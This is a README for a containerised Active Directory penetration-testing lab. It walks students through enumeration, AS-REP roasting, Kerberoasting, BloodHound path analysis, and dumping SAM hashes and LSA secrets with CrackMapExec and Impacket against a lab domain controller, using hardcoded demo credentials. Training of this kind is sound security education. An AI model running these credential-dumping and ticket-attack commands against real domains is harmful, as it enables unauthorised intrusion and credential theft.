# Lab 4: Active Directory & BloodHound

## Overview

Lab 4 teaches Active Directory exploitation and privilege escalation techniques. Students will learn to enumerate AD environments, identify privilege escalation paths, and use BloodHound for attack path analysis. This lab simulates a realistic Windows domain environment.

## Requirements

- Docker Engine 24.0+
- Docker Compose 2.0+
- 8GB RAM minimum (12GB recommended)
- 15GB free disk space
- Sufficient CPU cores (4+ recommended)

## Architecture

```
┌──────────────────────────────────────────────┐
│     Docker Network (172.18.4.0/24)           │
├──────────────────────────────────────────────┤
│  Windows Server 2019 DC01 (172.18.4.20)      │
│  ├── Active Directory Domain Services        │
│  ├── DNS Server (Port 53)                    │
│  ├── LDAP (Port 389)                         │
│  ├── Kerberos (Port 88)                      │
│  ├── SMB (Port 445)                          │
│  └── RDP (Port 3389)                         │
│                                              │
│  Kali Linux (172.18.4.10)                    │
│  ├── AD Enumeration Tools                    │
│  ├── CrackMapExec, Impacket                  │
│  └── BloodHound Collector                    │
│                                              │
│  BloodHound + Neo4j (172.18.4.30)           │
│  ├── Graph Database                         │
│  ├── Neo4j (Port 7474, 7687)                │
│  └── BloodHound Web UI                       │
└──────────────────────────────────────────────┘
```

## Quick Start

### 1. Start the Lab (takes 2-3 minutes)

```bash
cd lab4
docker-compose up -d
```

### 2. Wait for DC01 to be ready

```bash
# Monitor startup
docker-compose logs -f dc01

# Wait for "Active Directory is ready" message (1-2 minutes)
```

### 3. Connect to Kali Linux

```bash
docker-compose exec kali /bin/bash
```

### 4. Access BloodHound

Open browser to: `http://localhost:7474`

Credentials:
- Username: `neo4j`
- Password: `BloodHound!123`

## Learning Objectives

By the end of this lab, students will be able to:

- ✓ Enumerate Active Directory environments
- ✓ Identify domain users and groups
- ✓ Map privilege escalation paths
- ✓ Exploit Kerberos vulnerabilities
- ✓ Perform privilege escalation attacks
- ✓ Use BloodHound for attack graph analysis
- ✓ Document findings and create remediation plans

## AD Environment

### Default Domain Configuration

```
Domain: CORP.LAB
Domain Controller: DC01
Admin User: Administrator
Admin Password: P@ssw0rd!Lab4

Test Users:
- user1: P@ssw0rd1
- user2: P@ssw0rd2
- admin_user: P@ssw0rd!Admin
```

### Domain Structure

```
CORP.LAB
├── Administrators (High Privilege)
├── Domain Admins
├── Domain Users
├── Sales Department
├── Engineering Department
└── Finance Department
```

## Exercises

### Exercise 1: AD Enumeration

**Objective**: Learn basic Active Directory enumeration

From Kali container:

```bash
# 1. Check domain connectivity
nslookup dc01.corp.lab 172.18.4.20

# 2. Enumerate domain users
ldapsearch -h 172.18.4.20 -x -b "dc=corp,dc=lab" "(objectclass=user)"

# 3. Use CrackMapExec for domain enumeration
crackmapexec smb 172.18.4.20 -u "" -p ""

# 4. Enumerate shares
smbclient -L //172.18.4.20 -U ""

# 5. Dump domain info
rpcclient -U "" //172.18.4.20
> enumdomgroups
> querygroupmem <rid>
> exit
```

### Exercise 2: Kerberos Enumeration

**Objective**: Perform Kerberos-based attacks

```bash
# 1. Get Kerberos TGT (Ticket Granting Ticket)
kinit user1@CORP.LAB

# 2. List cached Kerberos tickets
klist

# 3. Use Impacket for Kerberos attacks
getTGT.py corp.lab/user1:P@ssw0rd1

# 4. Perform ASREProast (if any users have ASREP flag)
GetNPUsers.py -no-pass -usersfile users.txt corp.lab/

# 5. Perform Kerberoasting
GetUserSPNs.py -request corp.lab/user1:P@ssw0rd1
```

### Exercise 3: BloodHound Data Collection

**Objective**: Collect AD data and analyze with BloodHound

```bash
# 1. Download SharpHound collector
wget https://github.com/BloodHoundAD/BloodHound/releases/download/latest/SharpHound.zip

# 2. Run SharpHound on DC01
# (Requires Windows execution - may need to simulate)

# 3. Or use Python-based collector
python3 -m bloodhound -u user1 -p P@ssw0rd1 -d corp.lab -c All

# 4. Import data into BloodHound:
# - Go to http://localhost:7474
# - Upload JSON files collected
# - Analyze attack paths
```

### Exercise 4: Privilege Escalation

**Objective**: Identify and exploit privilege escalation opportunities

```bash
# 1. Check current user privileges
whoami /all

# 2. Look for unquoted service paths
wmic service list brief | findstr /v "Running"

# 3. Check for weak permissions
icacls C:\Program Files

# 4. Use mimikatz for credential dumping (if accessible)
# Note: Requires Windows execution

# 5. Check for unconstrained delegation
ldapdomaindump -u CORP.LAB\\user1 -p P@ssw0rd1 172.18.4.20
```

### Exercise 5: BloodHound Analysis

**Objective**: Use BloodHound to map attack paths

1. **Login to BloodHound** (`http://localhost:7474`)
2. **Navigate to Database Info**
3. **Run Pre-built Queries**:
   - "Find Shortest Paths to High-Value Targets"
   - "Find All Domain Admins"
   - "Find Dangerous Rights"
   - "Find AS-REP Roastable Users"
   - "Find Kerberoastable Users"
4. **Analyze the graph** and identify privilege escalation vectors

## Tools Reference

### CrackMapExec Commands

```bash
# Enumerate SMB
crackmapexec smb 172.18.4.0/24

# Dump SAM hashes
crackmapexec smb 172.18.4.20 -u user1 -p P@ssw0rd1 --sam

# Dump LSA secrets
crackmapexec smb 172.18.4.20 -u user1 -p P@ssw0rd1 --lsa

# Enum shares
crackmapexec smb 172.18.4.20 -u user1 -p P@ssw0rd1 --shares

# Enum disks
crackmapexec smb 172.18.4.20 -u user1 -p P@ssw0rd1 --disks

# Enum loggedon users
crackmapexec smb 172.18.4.20 -u user1 -p P@ssw0rd1 --loggedon-users

# Check for null sessions
crackmapexec smb 172.18.4.20 -u "" -p ""
```

### Impacket Commands

```bash
# Get TGT
getTGT.py corp.lab/user1:P@ssw0rd1

# Get TGS (Service Ticket)
getTGS.py -spn cifs/dc01.corp.lab corp.lab/user1:P@ssw0rd1

# ASREProasting
GetNPUsers.py -no-pass corp.lab/

# Kerberoasting
GetUserSPNs.py corp.lab/user1:P@ssw0rd1 -request

# LDAP Dump
ldapdomaindump -u CORP.LAB\\user1 -p P@ssw0rd1 172.18.4.20

# Dump domain users
GetADUsers.py -all corp.lab/user1:P@ssw0rd1
```

## Troubleshooting

### DC01 won't start

```bash
# Check Windows container support
docker run --rm mcr.microsoft.com/windows/servercore:ltsc2019 cmd /c echo OK

# If fails, DC01 requires Windows containers
# On Linux/Mac: Use Linux-based AD simulation instead
```

### DC01 too slow (initialization takes 5+ minutes)

This is normal for first startup. Wait for:

```bash
docker-compose logs dc01 | grep "AD is ready"
```

### Can't connect to LDAP

```bash
# Verify DC01 is running
docker-compose ps

# Check network connectivity
docker-compose exec kali nslookup dc01 172.18.4.20

# Test LDAP port
docker-compose exec kali nc -zv 172.18.4.20 389
```

### BloodHound not displaying data

```bash
# Check Neo4j is running
docker-compose logs bloodhound

# Verify Neo4j connectivity
curl http://localhost:7474

# If failing, restart BloodHound
docker-compose restart bloodhound
docker-compose logs -f bloodhound
```

### Authentication failures

```bash
# Verify credentials
# Default: neo4j / BloodHound!123

# Reset Neo4j password (if changed)
docker-compose exec bloodhound neo4j-admin set-initial-password BloodHound!123
docker-compose restart bloodhound
```

## Cleanup

### Stop containers (preserves data)

```bash
docker-compose stop
```

### Remove containers (preserves volumes)

```bash
docker-compose down
```

### Complete cleanup (removes everything)

```bash
docker-compose down -v
```

### Reset AD environment

```bash
docker-compose down -v
# Warning: All AD data will be lost
docker-compose up -d
```

## Advanced Configuration

### Add More Domain Users

Edit AD startup script to add:

```powershell
# Create users
New-ADUser -Name "User1" -AccountPassword (ConvertTo-SecureString "P@ssw0rd1" -AsPlainText -Force) -Enabled $true

# Add to groups
Add-ADGroupMember -Identity "Domain Admins" -Members "User1"
```

### Configure Unconstrained Delegation

```powershell
# Set attribute for unconstrained delegation
Set-ADUser -Identity User1 -TrustedForDelegation $true
```

### Create Service Accounts for Kerberoasting

```powershell
# Register SPN
setspn -a HTTP/webserver.corp.lab corp\serviceaccount
```

## Resources

- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Active Directory Penetration Testing](https://blog.harmj0y.net/)
- [Impacket Documentation](https://www.secureauth.com/labs/open-source-tools/impacket/)
- [CrackMapExec Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [AD Security Best Practices](https://adsecurity.org/)

## Success Criteria

You have completed Lab 4 when you can:

- ✓ Enumerate all domain users and groups
- ✓ Identify service accounts
- ✓ Find privilege escalation paths using BloodHound
- ✓ Perform Kerberoasting attack
- ✓ Execute privilege escalation exploit
- ✓ Generate complete attack path documentation

## Next Steps

After completing Lab 4, you should:

1. Study Active Directory security hardening
2. Document all attack vectors found
3. Move to Lab 5: Automated Pentesting
4. Practice domain privilege escalation

---

**Lab Created**: March 2026  
**Last Updated**: March 2026  
**Status**: Ready for Student Use
